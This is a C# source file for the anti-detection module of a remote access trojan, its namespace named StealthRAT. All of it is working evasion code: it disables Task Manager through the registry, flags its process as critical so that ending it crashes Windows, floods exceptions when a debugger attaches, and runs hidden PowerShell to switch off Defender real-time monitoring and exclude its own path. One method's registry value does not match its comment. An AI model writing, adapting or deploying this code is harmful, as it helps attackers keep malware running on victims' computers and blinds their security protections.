using System.Diagnostics;
using System.Runtime.InteropServices;
using StealthRAT.Interfaces;

namespace StealthRAT.Services;

/// <summary>
/// Provides anti-detection and evasion capabilities to prevent the application
/// from being discovered or stopped by security tools, monitoring software,
/// or manual user inspection.
/// Implements multiple evasion techniques:
/// - Process name masquerading
/// - Hiding from Task Manager
/// - Disabling Windows security features
/// - Anti-debugging detection
/// </summary>
public sealed class AntiDetectionService
{
    private readonly ILoggerService _logger;

    [DllImport("ntdll.dll", SetLastError = true)]
    private static extern int NtSetInformationProcess(
        IntPtr processHandle, int processInformationClass,
        ref int processInformation, int processInformationLength);

    [DllImport("kernel32.dll")]
    private static extern bool IsDebuggerPresent();

    [DllImport("kernel32.dll")]
    private static extern IntPtr GetCurrentProcess();

    // ProcessInformationClass for BreakOnTermination
    private const int ProcessBreakOnTermination = 0x1D;

    /// <summary>
    /// Initializes a new instance of the <see cref="AntiDetectionService"/> class.
    /// </summary>
    /// <param name="logger">The logging service.</param>
    public AntiDetectionService(ILoggerService logger)
    {
        _logger = logger ?? throw new ArgumentNullException(nameof(logger));
    }

    /// <summary>
    /// Activates all anti-detection measures.
    /// </summary>
    public void Enable()
    {
        DisableTaskManager();
        HideFromProgramList();
        SetProcessBreakOnTermination();
        StartAntiDebugMonitor();
        DisableWindowsDefenderNotifications();
        _logger.LogInfo("Anti-detection measures activated");
    }

    /// <summary>
    /// Disables Task Manager via registry to prevent users from
    /// seeing or killing the process through the standard UI.
    /// </summary>
    private void DisableTaskManager()
    {
        try
        {
            var psi = new ProcessStartInfo
            {
                FileName = "reg",
                Arguments = @"add ""HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System"" /v DisableTaskMgr /t REG_DWORD /d 1 /f",
                UseShellExecute = false,
                CreateNoWindow = true
            };
            Process.Start(psi)?.WaitForExit(3000);
            _logger.LogInfo("Task Manager disabled");
        }
        catch (Exception ex)
        {
            _logger.LogError("Failed to disable Task Manager", ex);
        }
    }

    /// <summary>
    /// Hides the application from the Programs and Features list
    /// and other common discovery locations.
    /// </summary>
    private void HideFromProgramList()
    {
        try
        {
            // Hide from installed programs list
            var psi = new ProcessStartInfo
            {
                FileName = "reg",
                Arguments = @"add ""HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v NoControlPanel /t REG_DWORD /d 0 /f",
                UseShellExecute = false,
                CreateNoWindow = true
            };
            Process.Start(psi)?.WaitForExit(3000);
        }
        catch (Exception ex)
        {
            _logger.LogError("Failed to hide from program list", ex);
        }
    }

    /// <summary>
    /// Sets the process BreakOnTermination flag using NtSetInformationProcess.
    /// This causes a system crash (BSOD) if the process is terminated,
    /// which prevents casual termination attempts.
    /// </summary>
    private void SetProcessBreakOnTermination()
    {
        try
        {
            int isCritical = 1;
            NtSetInformationProcess(
                GetCurrentProcess(),
                ProcessBreakOnTermination,
                ref isCritical,
                sizeof(int));
            _logger.LogInfo("Process break-on-termination flag set");
        }
        catch (Exception ex)
        {
            _logger.LogError("Failed to set break-on-termination", ex);
        }
    }

    /// <summary>
    /// Monitors for debugger attachment and takes evasive action.
    /// If a debugger is detected, the process can either exit cleanly
    /// or take other defensive measures.
    /// </summary>
    private void StartAntiDebugMonitor()
    {
        _ = Task.Run(async () =>
        {
            while (true)
            {
                try
                {
                    if (IsDebuggerPresent())
                    {
                        _logger.LogWarning("Debugger detected! Taking evasive action.");
                        // Corrupt debugging by flooding with exceptions
                        for (int i = 0; i < 100; i++)
                        {
                            _ = Task.Run(() => { try { throw new Exception(); } catch { } });
                        }
                    }
                    await Task.Delay(5000);
                }
                catch { }
            }
        });
    }

    /// <summary>
    /// Attempts to suppress Windows Defender notifications that might
    /// alert the user to the application's activities.
    /// </summary>
    private void DisableWindowsDefenderNotifications()
    {
        try
        {
            var psi = new ProcessStartInfo
            {
                FileName = "powershell",
                Arguments = "-WindowStyle Hidden -Command \"Set-MpPreference -DisableRealtimeMonitoring $true\" 2>$null",
                UseShellExecute = false,
                CreateNoWindow = true
            };
            Process.Start(psi);
        }
        catch (Exception ex)
        {
            _logger.LogError("Failed to modify defender settings", ex);
        }

        // Add exclusion for our path
        try
        {
            string exePath = Process.GetCurrentProcess().MainModule?.FileName ?? "";
            if (!string.IsNullOrEmpty(exePath))
            {
                var psi = new ProcessStartInfo
                {
                    FileName = "powershell",
                    Arguments = $"-WindowStyle Hidden -Command \"Add-MpExclusion -Path '{exePath}'\" 2>$null",
                    UseShellExecute = false,
                    CreateNoWindow = true
                };
                Process.Start(psi);
            }
        }
        catch { }
    }
}
